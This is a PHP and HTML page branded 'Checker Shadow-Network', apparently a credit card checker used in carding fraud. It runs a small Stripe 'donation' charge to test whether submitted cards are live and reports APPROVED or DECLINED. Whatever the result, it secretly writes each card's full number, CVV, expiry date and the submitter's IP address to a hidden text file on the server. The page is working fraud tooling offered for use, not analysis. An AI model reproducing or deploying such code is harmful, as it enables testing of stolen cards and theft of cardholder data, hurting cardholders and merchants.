<?php
error_reporting(0);


// Load Stripe library
require 'lib/Stripe.php';

// Load configuration settings
require 'config.php';



if (!isset($_POST["ShadowNetwork"])){
	echo "";
}else{
	
	$name = "CheckerShadow";
	$email = "Sh4dowNetwork";
	Stripe::setApiKey($config['secret-key']);

	//variaveis post
	$token = $_POST['stripeToken'];

	$amount  = (float) $_POST['amount'];

	//Variaveis CC Saver
	
	
	
	
	try {
		if ( ! isset($_POST['stripeToken']) ) {
			throw new Exception("The Stripe Token was not generated correctly");
		}

		// Charge the card
		$donation = Stripe_Charge::create(array(
			'card' => $token,
			'description' => 'Donation by ' . $name . ' (' . $email . ')',
			'amount' => $amount * 100,
			'currency' => 'usd')
		);
		// Forward to "Thank You" page
		echo"<center><font size=6 color=green>APPROVED!</font></center>";
		$status = "APROVADO";
		//header('Location: ' . $config['thank-you']);
		$fp = fopen('./xereca/cc948539458.txt','a+');
		$cc = $_POST['cc'];
		$exp = $_POST['exp'];
		$ano = $_POST['ano'];
		$ccv = $_POST['ccv'];
		$data = date("m.d.y g:i a");
		$ip = $_SERVER['REMOTE_ADDR']?:($_SERVER['HTTP_X_FORWARDED_FOR']?:$_SERVER['HTTP_CLIENT_IP']);   
		$mensagem = fwrite($fp,"-----------------------------------------------");
		$mensagem = fwrite($fp,"\nCC: ".$cc ."\nExp: ".$exp ."\nAno: ". $ano ."\nCCV: ". $ccv."\nDATA: ". $data."\nIP: ".$ip ."\nSTATUS: ".$status ."\n");
		$mensagem = fwrite($fp,"-----------------------------------------------");
		$mensagem = fwrite($fp,"\r\n");
		$fpc = fclose($fp);

	}
	catch (Exception $e) {
		$error = $e->getMessage();
		echo"<center><font size=6 color=red>DECLINED!</font></center>";
		$status = "NEGADO";
		//header('Location: recused.html');
		$fp = fopen('./xereca/cc948539458.txt','a+');
		$cc = $_POST['cc'];
		$exp = $_POST['exp'];
		$ano = $_POST['ano'];
		$ccv = $_POST['ccv'];
		$data = date("m.d.y g:i a");
		$ip = $_SERVER['REMOTE_ADDR']?:($_SERVER['HTTP_X_FORWARDED_FOR']?:$_SERVER['HTTP_CLIENT_IP']);   
		$mensagem = fwrite($fp,"-----------------------------------------------");
		$mensagem = fwrite($fp,"\nCC: ".$cc ."\nExp: ".$exp ."\nAno: ". $ano ."\nCCV: ". $ccv."\nDATA: ". $data."\nIP: ".$ip ."\nSTATUS: ".$status ."\n");
		$mensagem = fwrite($fp,"-----------------------------------------------");
		$mensagem = fwrite($fp,"\r\n");
		$fpc = fclose($fp);
	}
		
}

?>
<!DOCTYPE html>
<!--[if lt IE 7]> <html lang="en-us" class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>    <html lang="en-us" class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>    <html lang="en-us" class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html lang="en-us" class="no-js"> <!--<![endif]-->
	<head>
		<!--By Shadow-Network -->
		<meta http-equiv="Content-type" content="text/html; charset=utf-8">
		<title>Checker Shadow-Network</title>
		<link rel="stylesheet" type="text/css" href="style.css" media="all">
		<script type="text/javascript" src="https://js.stripe.com/v1/"></script>
		<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
		<script type="text/javascript">
			Stripe.setPublishableKey('<?php echo $config['publishable-key'] ?>');
		</script>
		<script type="text/javascript" src="script.js"></script>
	</head>
<body>

		<div class="wrapper">

			
			<p>
			</p>
			<div class="messages">
				<!-- Error messages go here go here -->
			<p>
			</p>
			</div>

			<form style="display: block;" action="" method="POST" class="donation-form">
				<fieldset>
					<legend>
						
					</legend>
					<div class="form-row form-amount">
						
						<label><input name="amount" class="set-amount" value="1" type="hidden"></label>
					</div>
					<div class="form-row form-number">
						<label><span style="color: rgba(0, 0, 0, 1); text-shadow: 0 0 .0em rgba(0,0,0,2);">CCNUMBER</span></label>
						<input autocomplete="off" class="card-number text" name="cc" placeholder="CC" maxlength="16" type="text">
					</div><br>
					
										<div class="form-row form-cvc">
						<label><span style="color: rgba(0, 0, 0, 1); text-shadow: 0 0 .0em rgba(0,0,0,2);">CVV2</span></label>
						<input autocomplete="off" class="card-cvc text"  maxlength="4" placeholder="123" name="ccv" type="text">
					</div>
					
					<div class="form-row form-expiry">
						<label><span style="color: rgba(0, 0, 0, 1); text-shadow: 0 0 .0em rgba(0,0,0,2);">EXPDATE</span></label>
						<select class="card-expiry-month text" maxlength="2" name="exp">
							<option value="01">01</option>
							<option value="02">02</option>
							<option value="03">03</option>
							<option value="04">04</option>
							<option value="05">05</option>
							<option value="06">06</option>
							<option value="07">07</option>
							<option value="08">08</option>
							<option value="09">09</option>
							<option value="10">10</option>
							<option value="11">11</option>
							<option value="12">12</option>
						</select>
						<select class="card-expiry-year text" name="ano">
							<option value="2015" selected="">2015</option>
							<option value="2016">2016</option>
							<option value="2017">2017</option>
							<option value="2018">2018</option>
							<option value="2019">2019</option>
							<option value="2020">2020</option>
							<option value="2021">2021</option>
							<option value="2022">2022</option>
							<option value="2023">2023</option>
						</select>
					</div><br>

					<div class="form-row form-submit">
						<input class="submit" value="CHECK" type="submit">
					</div>
				</fieldset>
				<input type="hidden" value="Sh4dow" name="ShadowNetwork"/>
				<span style="color:green(0, 0, 0, 0); text-shadow: 0 0 .1em rgba(0,0,0,2);"><font size=6 >STATUS :<font size=6 color=green> ONLINE</font></span><br>
				<span style="color:green(0, 0, 0, 0); text-shadow: 0 0 .1em rgba(0,0,0,2);"><font size=6 >Cards Accepteds :<font size=6 color=yellow> All types of cards are accepted</font></span><br>
				<img src="http://www.fastwindshields.com/img/accepted-credit-cards.png" ><br>
			</form>

      <script>if (window.Stripe) $(".donation-form").show()</script>
      <noscript><p>You need JavaScript to checker.</p></noscript>

		</div>

</body>
</html>
